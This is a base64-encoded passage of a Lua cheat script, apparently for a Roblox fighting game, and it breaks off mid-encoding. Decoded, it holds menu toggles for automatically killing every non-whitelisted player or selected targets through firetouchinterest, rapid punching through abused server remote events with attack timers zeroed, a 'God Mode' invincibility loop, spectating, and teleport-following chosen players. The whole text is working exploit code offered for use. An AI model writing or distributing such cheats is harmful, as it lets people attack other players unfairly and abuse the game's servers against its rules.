NrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgYXV0b0tpbGwgPSBzdGF0ZQoKICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgd2hpbGUgYXV0b0tpbGwgZG8KICAgICAgICAgICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IExvY2FsUGxheWVyLkNoYXJhY3RlciBvciBMb2NhbFBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKICAgICAgICAgICAgICAgIGxvY2FsIHJpZ2h0SGFuZCA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUmlnaHRIYW5kIikKICAgICAgICAgICAgICAgIGxvY2FsIGxlZnRIYW5kID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJMZWZ0SGFuZCIpCgogICAgICAgICAgICAgICAgbG9jYWwgcHVuY2ggPSBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQogICAgICAgICAgICAgICAgaWYgcHVuY2ggYW5kIG5vdCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikgdGhlbgogICAgICAgICAgICAgICAgICAgIHB1bmNoLlBhcmVudCA9IGNoYXJhY3RlcgogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgcmlnaHRIYW5kIGFuZCBsZWZ0SGFuZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHRhcmdldCBpbiBpcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRhcmdldCB+PSBMb2NhbFBsYXllciBhbmQgbm90IHBsYXllcldoaXRlbGlzdFt0YXJnZXQuTmFtZV0gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0Q2hhciA9IHRhcmdldC5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHJvb3RQYXJ0ID0gdGFyZ2V0Q2hhciBhbmQgdGFyZ2V0Q2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiByb290UGFydCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdChyaWdodEhhbmQsIHJvb3RQYXJ0LCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdChsZWZ0SGFuZCwgcm9vdFBhcnQsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHJpZ2h0SGFuZCwgcm9vdFBhcnQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KGxlZnRIYW5kLCByb290UGFydCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4wNSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCn0pCgotLSBUYXJnZXQgS2lsbCBTZWN0aW9uCktpbGxzVGFiOlNlY3Rpb24oe1RpdGxlID0gIlRhcmdldCBLaWxsIn0pCgpsb2NhbCB0YXJnZXREcm9wZG93biA9IEtpbGxzVGFiOkRyb3Bkb3duKHsKICAgIFRpdGxlID0gIlNlbGVjdCBUYXJnZXQiLAogICAgTGlzdCA9IHt9LAogICAgVmFsdWUgPSAiIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24obmFtZSkKICAgICAgICBpZiBuYW1lIGFuZCBub3QgdGFibGUuZmluZCh0YXJnZXRQbGF5ZXJOYW1lcywgbmFtZSkgdGhlbgogICAgICAgICAgICB0YWJsZS5pbnNlcnQodGFyZ2V0UGxheWVyTmFtZXMsIG5hbWUpCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIFBvcHVsYXRlIHRhcmdldCBkcm9wZG93bgpmb3IgXywgcGxheWVyIGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgIGlmIHBsYXllciB+PSBMb2NhbFBsYXllciB0aGVuCiAgICAgICAgdGFyZ2V0RHJvcGRvd246QWRkKHBsYXllci5OYW1lKQogICAgICAgIHRhcmdldERyb3Bkb3duSXRlbXNbcGxheWVyLk5hbWVdID0gdHJ1ZQogICAgZW5kCmVuZAoKUGxheWVycy5QbGF5ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHBsYXllcikKICAgIGlmIHBsYXllciB+PSBMb2NhbFBsYXllciB0aGVuCiAgICAgICAgdGFyZ2V0RHJvcGRvd246QWRkKHBsYXllci5OYW1lKQogICAgICAgIHRhcmdldERyb3Bkb3duSXRlbXNbcGxheWVyLk5hbWVdID0gdHJ1ZQogICAgZW5kCmVuZCkKClBsYXllcnMuUGxheWVyUmVtb3Zpbmc6Q29ubmVjdChmdW5jdGlvbihwbGF5ZXIpCiAgICBpZiB0YXJnZXREcm9wZG93bkl0ZW1zW3BsYXllci5OYW1lXSB0aGVuCiAgICAgICAgdGFyZ2V0RHJvcGRvd25JdGVtc1twbGF5ZXIuTmFtZV0gPSBuaWwKICAgICAgICB0YXJnZXREcm9wZG93bjpDbGVhcigpCiAgICAgICAgZm9yIG5hbWUgaW4gcGFpcnModGFyZ2V0RHJvcGRvd25JdGVtcykgZG8KICAgICAgICAgICAgdGFyZ2V0RHJvcGRvd246QWRkKG5hbWUpCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBmb3IgaSA9ICN0YXJnZXRQbGF5ZXJOYW1lcywgMSwgLTEgZG8KICAgICAgICBpZiB0YXJnZXRQbGF5ZXJOYW1lc1tpXSA9PSBwbGF5ZXIuTmFtZSB0aGVuCiAgICAgICAgICAgIHRhYmxlLnJlbW92ZSh0YXJnZXRQbGF5ZXJOYW1lcywgaSkKICAgICAgICBlbmQKICAgIGVuZAplbmQpCgpLaWxsc1RhYjpUZXh0Ym94KHsKICAgIFRpdGxlID0gIlJlbW92ZSBUYXJnZXQiLAogICAgRGVzYyA9ICJSZW1vdmUgcGxheWVyIGZyb20gdGFyZ2V0IGxpc3QiLAogICAgUGxhY2Vob2xkZXIgPSAiUGxheWVyIE5hbWUiLAogICAgVmFsdWUgPSAiIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24obmFtZSkKICAgICAgICBmb3IgaSwgdiBpbiBpcGFpcnModGFyZ2V0UGxheWVyTmFtZXMpIGRvCiAgICAgICAgICAgIGlmIHYgPT0gbmFtZSB0aGVuCiAgICAgICAgICAgICAgICB0YWJsZS5yZW1vdmUodGFyZ2V0UGxheWVyTmFtZXMsIGkpCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAp9KQoKS2lsbHNUYWI6VG9nZ2xlKHsKICAgIFRpdGxlID0gIlN0YXJ0IEtpbGwgVGFyZ2V0IiwKICAgIERlc2MgPSAiS2lsbCBzZWxlY3RlZCB0YXJnZXRzIG9ubHkiLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAga2lsbFRhcmdldCA9IHN0YXRlCgogICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICB3aGlsZSBraWxsVGFyZ2V0IGRvCiAgICAgICAgICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIgb3IgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCgogICAgICAgICAgICAgICAgbG9jYWwgcHVuY2ggPSBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQogICAgICAgICAgICAgICAgaWYgcHVuY2ggYW5kIG5vdCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikgdGhlbgogICAgICAgICAgICAgICAgICAgIHB1bmNoLlBhcmVudCA9IGNoYXJhY3RlcgogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgbG9jYWwgcmlnaHRIYW5kID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiUmlnaHRIYW5kIiwgNSkKICAgICAgICAgICAgICAgIGxvY2FsIGxlZnRIYW5kID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiTGVmdEhhbmQiLCA1KQoKICAgICAgICAgICAgICAgIGlmIHJpZ2h0SGFuZCBhbmQgbGVmdEhhbmQgdGhlbgogICAgICAgICAgICAgICAgICAgIGZvciBfLCBuYW1lIGluIGlwYWlycyh0YXJnZXRQbGF5ZXJOYW1lcykgZG8KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0ID0gUGxheWVyczpGaW5kRmlyc3RDaGlsZChuYW1lKQogICAgICAgICAgICAgICAgICAgICAgICBpZiB0YXJnZXQgYW5kIHRhcmdldCB+PSBMb2NhbFBsYXllciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCByb290UGFydCA9IHRhcmdldC5DaGFyYWN0ZXIgYW5kIHRhcmdldC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgcm9vdFBhcnQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3QocmlnaHRIYW5kLCByb290UGFydCwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3QobGVmdEhhbmQsIHJvb3RQYXJ0LCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdChyaWdodEhhbmQsIHJvb3RQYXJ0LCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdChsZWZ0SGFuZCwgcm9vdFBhcnQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDUpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAp9KQoKLS0gU3B5IFNlY3Rpb24KS2lsbHNUYWI6U2VjdGlvbih7VGl0bGUgPSAiU3B5In0pCgpsb2NhbCBzcHlUYXJnZXREcm9wZG93biA9IEtpbGxzVGFiOkRyb3Bkb3duKHsKICAgIFRpdGxlID0gIlNlbGVjdCBWaWV3IFRhcmdldCIsCiAgICBMaXN0ID0ge30sCiAgICBWYWx1ZSA9ICIiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihuYW1lKQogICAgICAgIHRhcmdldFBsYXllck5hbWUgPSBuYW1lCiAgICBlbmQKfSkKCmZvciBfLCBwbGF5ZXIgaW4gaXBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgaWYgcGxheWVyIH49IExvY2FsUGxheWVyIHRoZW4KICAgICAgICBzcHlUYXJnZXREcm9wZG93bjpBZGQocGxheWVyLk5hbWUpCiAgICBlbmQKZW5kCgpQbGF5ZXJzLlBsYXllckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24ocGxheWVyKQogICAgaWYgcGxheWVyIH49IExvY2FsUGxheWVyIHRoZW4KICAgICAgICBzcHlUYXJnZXREcm9wZG93bjpBZGQocGxheWVyLk5hbWUpCiAgICBlbmQKZW5kKQoKUGxheWVycy5QbGF5ZXJSZW1vdmluZzpDb25uZWN0KGZ1bmN0aW9uKHBsYXllcikKICAgIGlmIHBsYXllciB+PSBMb2NhbFBsYXllciB0aGVuCiAgICAgICAgc3B5VGFyZ2V0RHJvcGRvd246Q2xlYXIoKQogICAgICAgIGZvciBfLCBwbHIgaW4gaXBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgICAgICAgICBpZiBwbHIgfj0gTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgICAgICAgICAgc3B5VGFyZ2V0RHJvcGRvd246QWRkKHBsci5OYW1lKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAplbmQpCgpLaWxsc1RhYjpUb2dnbGUoewogICAgVGl0bGUgPSAiVmlldyBQbGF5ZXIiLAogICAgRGVzYyA9ICJTcGVjdGF0ZSBzZWxlY3RlZCBwbGF5ZXIiLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgc3B5aW5nID0gc3RhdGUKICAgICAgICBpZiBub3Qgc3B5aW5nIHRoZW4KICAgICAgICAgICAgbG9jYWwgY2FtID0gd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEKICAgICAgICAgICAgY2FtLkNhbWVyYVN1YmplY3QgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSBvciBMb2NhbFBsYXllcgogICAgICAgICAgICByZXR1cm4KICAgICAgICBlbmQKICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgd2hpbGUgc3B5aW5nIGRvCiAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXQgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKHRhcmdldFBsYXllck5hbWUpCiAgICAgICAgICAgICAgICBpZiB0YXJnZXQgYW5kIHRhcmdldCB+PSBMb2NhbFBsYXllciB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgaHVtYW5vaWQgPSB0YXJnZXQuQ2hhcmFjdGVyIGFuZCB0YXJnZXQuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpCiAgICAgICAgICAgICAgICAgICAgaWYgaHVtYW5vaWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DYW1lcmFTdWJqZWN0ID0gaHVtYW5vaWQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCn0pCgotLSBDb21iYXQgU2VjdGlvbgpLaWxsc1RhYjpTZWN0aW9uKHtUaXRsZSA9ICJDb21iYXQifSkKCktpbGxzVGFiOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJBdXRvIEhpdCBObyBBbmltIiwKICAgIERlc2MgPSAiUmFwaWQgcHVuY2ggd2l0aG91dCBhbmltYXRpb24iLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgYXV0b1B1bmNoTm9BbmltID0gc3RhdGUKICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgd2hpbGUgYXV0b1B1bmNoTm9BbmltIGRvCiAgICAgICAgICAgICAgICBsb2NhbCBwdW5jaCA9IExvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpIG9yIExvY2FsUGxheWVyLkNoYXJhY3RlciBhbmQgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpCiAgICAgICAgICAgICAgICBpZiBwdW5jaCB0aGVuCiAgICAgICAgICAgICAgICAgICAgaWYgcHVuY2guUGFyZW50IH49IExvY2FsUGxheWVyLkNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHB1bmNoLlBhcmVudCA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInB1bmNoIiwgInJpZ2h0SGFuZCIpCiAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicHVuY2giLCAibGVmdEhhbmQiKQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIGF1dG9QdW5jaE5vQW5pbSA9IGZhbHNlCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjAxKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKfSkKCktpbGxzVGFiOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJRdWljayBIaXQiLAogICAgRGVzYyA9ICJGYXN0IHB1bmNoIHdpdGggbm8gZGVsYXkiLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgX0cuYXV0b1B1bmNoQWN0aXZlID0gc3RhdGUKICAgICAgICBpZiBzdGF0ZSB0aGVuCiAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgd2hpbGUgX0cuYXV0b1B1bmNoQWN0aXZlIGRvCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgcHVuY2ggPSBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQogICAgICAgICAgICAgICAgICAgIGlmIHB1bmNoIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgcHVuY2guUGFyZW50ID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHB1bmNoOkZpbmRGaXJzdENoaWxkKCJhdHRhY2tUaW1lIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHVuY2guYXR0YWNrVGltZS5WYWx1ZSA9IDAKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgd2hpbGUgX0cuYXV0b1B1bmNoQWN0aXZlIGRvCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgcHVuY2ggPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQogICAgICAgICAgICAgICAgICAgIGlmIHB1bmNoIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgcHVuY2g6QWN0aXZhdGUoKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVsc2UKICAgICAgICAgICAgbG9jYWwgcHVuY2ggPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQogICAgICAgICAgICBpZiBwdW5jaCB0aGVuCiAgICAgICAgICAgICAgICBwdW5jaC5QYXJlbnQgPSBMb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gR29kIE1vZGUgU2VjdGlvbgpLaWxsc1RhYjpTZWN0aW9uKHtUaXRsZSA9ICJHb2QgTW9kZSJ9KQoKS2lsbHNUYWI6VG9nZ2xlKHsKICAgIFRpdGxlID0gIkdvZCBNb2RlIiwKICAgIERlc2MgPSAiSW52aW5jaWJpbGl0eSBpbiBicmF3bHMiLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgZ29kTW9kZVRvZ2dsZSA9IHN0YXRlCiAgICAgICAgaWYgc3RhdGUgdGhlbgogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHdoaWxlIGdvZE1vZGVUb2dnbGUgZG8KICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuckV2ZW50cy5icmF3bEV2ZW50OkZpcmVTZXJ2ZXIoImpvaW5CcmF3bCIpCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCktpbGxzVGFiOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJEYW1hZ2UgV2l0aCBHb2Rtb2RlIiwKICAgIERlc2MgPSAiRGVhbCBkYW1hZ2Ugd2hpbGUgaW4gZ29kIG1vZGUiLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgZ29kRGFtYWdlQWN0aXZlID0gc3RhdGUKICAgICAgICBpZiBzdGF0ZSB0aGVuCiAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgd2hpbGUgZ29kRGFtYWdlQWN0aXZlIGRvCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgZ3JvdW5kU2xhbSA9IHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiR3JvdW5kIFNsYW0iKSBvciAocGxheWVyLkNoYXJhY3RlciBhbmQgcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiR3JvdW5kIFNsYW0iKSkKCiAgICAgICAgICAgICAgICAgICAgaWYgZ3JvdW5kU2xhbSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGdyb3VuZFNsYW0uUGFyZW50ID09IHBsYXllci5CYWNrcGFjayB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBncm91bmRTbGFtLlBhcmVudCA9IHBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICBpZiBncm91bmRTbGFtOkZpbmRGaXJzdENoaWxkKCJhdHRhY2tUaW1lIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZ3JvdW5kU2xhbS5hdHRhY2tUaW1lLlZhbHVlID0gMAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgIHBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJzbGFtIikKICAgICAgICAgICAgICAgICAgICAgICAgZ3JvdW5kU2xhbTpBY3RpdmF0ZSgpCiAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpIAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gRm9sbG93IFNlY3Rpb24KS2lsbHNUYWI6U2VjdGlvbih7VGl0bGUgPSAiRm9sbG93In0pCgpsb2NhbCBmb2xsb3dEcm9wZG93biA9IEtpbGxzVGFiOkRyb3Bkb3duKHsKICAgIFRpdGxlID0gIkZvbGxvdyBQbGF5ZXIgKFRQKSIsCiAgICBMaXN0ID0ge30sCiAgICBWYWx1ZSA9ICIiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzZWxlY3RlZCkKICAgICAgICBpZiBzZWxlY3RlZCBhbmQgc2VsZWN0ZWQgfj0gIiIgdGhlbgogICAgICAgICAgICBsb2NhbCB0YXJnZXQgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKHNlbGVjdGVkKQogICAgICAgICAgICBpZiB0YXJnZXQgdGhlbgogICAgICAgICAgICAgICAgZm9sbG93VGFyZ2V0ID0gdGFyZ2V0Lk5hbWUKICAgICAgICAgICAgICAgIGZvbGxvd2luZyA9IHRydWUKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLS0gSW1tZWRpYXRlIFRQIHdoZW4gc2VsZWN0ZWQKICAgICAgICAgICAgICAgIGxvY2FsIGZ1bmN0aW9uIGZvbGxvd1BsYXllcih0YXJnZXRQbGF5ZXIpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgbXlDaGFyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0Q2hhciA9IHRhcmdldFBsYXllci5DaGFyYWN0ZXIKCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IChteUNoYXIgYW5kIHRhcmdldENoYXIpIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgICAgIGxvY2FsIG15SFJQID0gbXlDaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRIUlAgPSB0YXJnZXRDaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKCiAgICAgICAgICAgICAgICAgICAgaWYgbXlIUlAgYW5kIHRhcmdldEhSUCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGZvbGxvd1BvcyA9IHRhcmdldEhSUC5Qb3NpdGlvbiAtICh0YXJnZXRIUlAuQ0ZyYW1lLkxvb2tWZWN0b3IgKiAzKQogICAgICAgICAgICAgICAgICAgICAgICBteUhSUC5DRnJhbWUgPSBDRnJhbWUubmV3KGZvbGxvd1BvcywgdGFyZ2V0SFJQLlBvc2l0aW9uKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGZvbGxvd1BsYXllcih0YXJnZXQpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBQb3B1bGF0ZSBmb2xsb3cgZHJvcGRvd24KZm9yIF8sIHBsYXllciBpbiBpcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICBpZiBwbGF5ZXIgfj0gTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgIGZvbGxvd0Ryb3Bkb3duOkFkZChwbGF5ZXIuTmFtZSkKICAgIGVuZAplbmQKClBsYXllcnMuUGxheWVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihwbGF5ZXIpCiAgICBpZiBwbGF5ZXIgfj0gTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgIGZvbGxvd0Ryb3Bkb3duOkFkZChwbGF5ZXIuTmFtZSkKICAgIGVuZAplbmQpCgpQbGF5ZXJzLlBsYXllclJlbW92aW5nOkNvbm5lY3QoZnVuY3Rpb24ocGxheWVyKQogICAgZm9sbG93RHJvcGRvd246Q2xlYXIoKQogICAgZm9yIF8sIHBsciBpbiBpcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgaWYgcGxyIH49IExvY2FsUGxheWVyIHRoZW4KICAgICAgICAgICAgZm9sbG93RHJvcGRvd246QWRkKHBsci5OYW1lKQogICAgICAgIGVuZAogICAgZW5kCiAgICBpZiBmb2xsb3dUYXJnZXQgPT0gcGxheWVyLk5hbWUgdGhlbgogICAgICAgIGZvbGxvd1RhcmdldCA9IG5pbAogICAgICAgIGZvbGxvd2luZyA9IGZhbHNlCiAgICBlbmQKZW5kKQoKS2lsbHNUYWI6QnV0dG9uKHsKICAgIFRpdGxlID0gIlVuZm9sbG93IiwKICAgIERlc2MgPSAiU3RvcCBmb2xsb3dpbmcgY3VycmVudCB0YXJnZXQiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgZm9sbG93aW5nID0gZmFsc2UKICAgICAgICBmb2xsb3dUYXJnZXQgPSBuaWwKICAgIGVuZAp9KQoKLS0gRm9sbG93IGxvb3AKdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICB3aGlsZSB0cnVlIGRvCiAgICAgICAgdGFzay53YWl0KDAuMikKICAgICAgICBpZiBmb2xsb3dpbmcgYW5kIGZvbGxvd1RhcmdldCB0aGVuCiAgICAgICAgICAgIGxvY2FsIHRhcmdldCA9IFBsYXllc